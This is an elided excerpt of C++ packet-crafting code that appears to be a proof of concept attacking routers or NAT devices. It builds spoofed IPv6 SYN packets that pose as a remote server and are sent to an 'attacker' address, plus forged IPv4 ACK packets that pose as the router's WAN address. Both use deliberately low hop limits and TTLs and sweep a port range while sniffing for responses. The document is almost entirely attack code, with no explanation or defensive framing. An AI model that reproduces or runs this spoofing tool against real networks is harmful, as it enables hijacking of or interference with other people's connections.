...
bool callback(const PDU &pdu) {
	...
	if (ip.next_header() == 6 && ip.src_addr() == remote_server_ipv6 && ip.dst_addr() == attacker_private_ip) {
...
int main(int argc, char** argv)
{
    ...
    remote_server_ipv6 = IPv6Address(argv[2]);
    remote_server_ip = IPv4Address(argv[3]);
    remote_server_port = atoi(argv[4]);
    router_wan_ip = IPv4Address(argv[5]);
    packet_iface = argv[6];
    self_mac_address = argv[7];
    router_mac_address = argv[8];
    port_search_range = atoi(argv[9]);
    
    sniff_filter = "tcp port " + string(argv[4]);
    ...
    for (int i = 0; i < end_port - start_port ; i++) {
        syn_pkts[i] = EthernetII(router_mac_address, self_mac_address) / IPv6(remote_server_ipv6, attacker_private_ip) / TCP(remote_server_port, start_port + i);
        syn_pkts[i].rfind_pdu<IPv6>().hop_limit(5);
        syn_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        syn_pkts[i].rfind_pdu<TCP>().seq(1);
    }
    for (int i = 0; i < end_port - start_port ; i++) {
        ack_pkts[i] = EthernetII(router_mac_address, self_mac_address) / IP(router_wan_ip, remote_server_ip) / TCP(start_port + i, remote_server_port);
        ack_pkts[i].rfind_pdu<IP>().ttl(4);
